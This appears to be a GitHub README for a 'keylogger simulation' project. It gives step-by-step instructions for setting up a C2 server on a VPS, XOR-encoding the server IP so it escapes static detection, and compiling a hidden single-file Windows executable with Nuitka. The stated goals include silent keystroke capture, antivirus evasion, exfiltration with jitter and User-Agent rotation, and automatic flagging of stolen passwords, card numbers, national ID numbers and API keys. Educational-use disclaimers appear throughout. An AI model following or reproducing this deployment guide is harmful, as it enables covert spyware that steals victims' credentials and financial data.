</div>

<div align="center">
  <h1>Keylogger Simulation with Rule-based Pattern Detection Algorithm</h1>
  <p>For authorised cyber security testing only. 5 detection rules. Built with Python & Node.js.</p>
</div>

<div align="center">

[![Python](https://img.shields.io/badge/python-3.9.9-blue?style=flat-square)](https://www.python.org/)
[![Nuitka](https://img.shields.io/badge/compiled%20with-Nuitka-5A4A42?style=flat-square)](https://nuitka.net/)
[![Windows](https://img.shields.io/badge/platform-Windows-lightgrey?style=flat-square)](#)
[![Educational Only](https://img.shields.io/badge/use-educational%20only-red?style=flat-square)](DISCLAIMER.md)

</div>

> **⚠️ EDUCATIONAL & AUTHORISED USE ONLY**  
> This tool is for red‑team exercises, security research, and authorised penetration testing.  
> Do **not** deploy on any system without explicit written permission.  
> See [DISCLAIMER.md](DISCLAIMER.md) for full legal terms.

## Overview

This project demonstrates a realistic keylogger that:
- Silently captures keystrokes (Windows, Linux, macOS)
- Uses **XOR obfuscation** and **dynamic imports** to evade basic antivirus
- Sends exfiltrated data to a remote C2 server with **random jitter** and **User‑Agent rotation**
- The server applies **rule‑based pattern detection** to automatically flag high‑value data:
  - Email addresses
  - Passwords (keyword‑based and heuristic)
  - Credit card numbers
  - Social Numbers (international and common formats)
  - API keys (32+ characters)
- A live **dashboard** – no need to watch raw keystroke logs
- **Persistent local logs** on the server:
  - `keyboard_capture.txt` — all raw keystrokes received
  - `flagged_capture.txt` — only events that matched a detection rule
---

## 1. Server Setup (Command & Control)

You can run the server on a **Linode VPS** (realistic infrastructure) or on your any preferred VPS for testing.

### 1.1 Linode VPS

1. **Create a Linode** (Ubuntu 22.04 LTS, Nanode plan works).

```bash
# SSH into your Linode (Ubuntu 22.04)
ssh root@<your_linode_ip>

# Clone the repository
git clone https://github.com/nickrar/keylogger-simulation.git
cd keylogger-simulation

# Run the automatic setup script (installs Node.js, npm, dependencies, reboots)
python3 setup.py

# After reboot, SSH again and start the server
ssh root@<your_linode_ip>
cd keylogger-simulation
node server.js
```

## 2. Keylogger Configuration

The keylogger must know your server’s IP address and port. These are stored in XOR‑obfuscated bytes to avoid static detection.

### 2.1 Encode your server IP

Open a Python shell and run:

```bash
def xor_encode(ip, key=0x3F):
    return bytes([ord(c) ^ key for c in ip])

print(xor_encode("YOUR_SERVER_IP"))   # e.g., "192.168.1.100"
```

Copy the output (e.g., b'\x...').

### 2.2 Replace the IP in keylogger.py

Edit keylogger.py and find:

```bash
_ip_raw = b'\x0e\x08\x0d\x11\x0d\x0c\x06\x11\x0e\x09\x0d\x11\x0e\x0d'
```

Replace it with your encoded bytes.

### 2.3 (Optional) Change the port

If you use a different port than 8080, encode the port as a string (e.g., "9090") and replace:

```bash
_port_raw = b'\x07\x0f\x07\x0f'   # encodes "8080"
```

## 3. Compilation & Deployment

The keylogger is designed to be compiled into a standalone Windows executable before use.
This section walks you through building the .exe with Nuitka – the exact same environment and command that were verified to work.

## 3.1 Prerequisites

Python 3.9.9 – the exact version used during development.
Other versions may work, but compatibility is only guaranteed with 3.9.9.

Nuitka – Python-to-C compiler (version 4.1.1 was tested).

MinGW-w64 – required to compile the generated C code.

The dependencies listed in requirements.txt.

Verify your environment
Once you have Python 3.9.9 installed, create a virtual environment and install Nuitka:

```bash
python -m venv keylogger_env
keylogger_env\Scripts\activate
pip install nuitka
```

Check that Nuitka picks up the correct Python version and compiler:

```bash
nuitka --version
```
Expected output (example):

```bash
4.1.1
Commercial: None
Python: 3.9.9 (tags/v3.9.9:ccb0e6a, Nov 15 2021, 18:08:50) [MSC v.1929 64 bit (AMD64)]
Flavor: CPython Official
Executable: ~\Desktop\keylogger-simulation-main\keylogger_env\Scripts\python.exe
OS: Windows
Arch: x86_64
WindowsRelease: 10
Nuitka-Scons: Non downloaded winlibs-gcc … is being ignored, Nuitka is very dependent on the precise one.
Version C compiler: gcc (gcc 15.2.0).
```

If Nuitka complains about the compiler or you don’t have MinGW‑w64, install it from winlibs.com (choose the 64‑bit, POSIX threads, SEH exception handling build).
Add the bin folder of MinGW‑w64 to your system PATH.

## 3.2 Install keylogger dependencies

With the virtual environment active, create a requirements.txt file containing exactly these lines:

```bash
certifi==2022.6.15
charset-normalizer==2.1.0
idna==3.3
pynput==1.7.6
requests==2.28.1
six==1.16.0
urllib3==1.26.11
```

Then install them:

```bash
pip install -r requirements.txt
```

## 3.3 Compile the keylogger with Nuitka

Navigate to the folder that contains keylogger.py and run:

```bash
nuitka --onefile --windows-console-mode=disable --standalone --include-package=pynput --include-package=requests --assume-yes-for-downloads --mingw64 keylogger.py
```

Explanation of every flag:

| Flag | Purpose |
|------|---------|
| `--onefile` | Bundles everything into a single .exe – easier to deploy and harder to analyse. |
| `--windows-console-mode=disable` | Hides the console window when the keylogger runs (stealth). |
| `--standalone` | Creates a fully self‑contained build (Nuitka embeds all required Python components). |
| `--include-package=pynput` | Forces inclusion of the pynput package; necessary because the keylogger uses dynamic imports that Nuitka might otherwise miss. |
| `--include-package=requests` | Forces inclusion of requests for the same reason. |
| `--assume-yes-for-downloads` | Automatically accepts any prompts to download required dependencies (e.g., MinGW if you hadn’t pre‑installed it). |
| `--mingw64` | Tells Nuitka to use the MinGW‑w64 compiler instead of MSVC. Make sure gcc is on your PATH. |

After a successful build you will find keylogger.exe in the current directory.

## 3.4 Test the compiled keylogger

1. Make sure your C2 server is running (node server.js).

2. On a test machine (isolated lab), execute keylogger.exe.

3. Open Notepad and type something like:

```bash
my email is test@gmail.com and my password is MySecret123!
```

4. Open the dashboard (http://<server_ip>:8080) – you will see flagged entries appear automatically, confirming the full chain works

5. On the server, check the generated files:

```bash
cat keyboard_capture.txt
cat flagged_capture.txt
```

You should see the raw keystrokes and the flagged email/password, confirming the full chain works.

## License
This project is provided for educational and authorized security research purposes only.
The source code is available under the [MIT License](LICENSE).

You are free to use, modify, and distribute it for non‑malicious, lawful purposes.
Any use in violation of computer fraud laws or unauthorized system access is strictly prohibited.
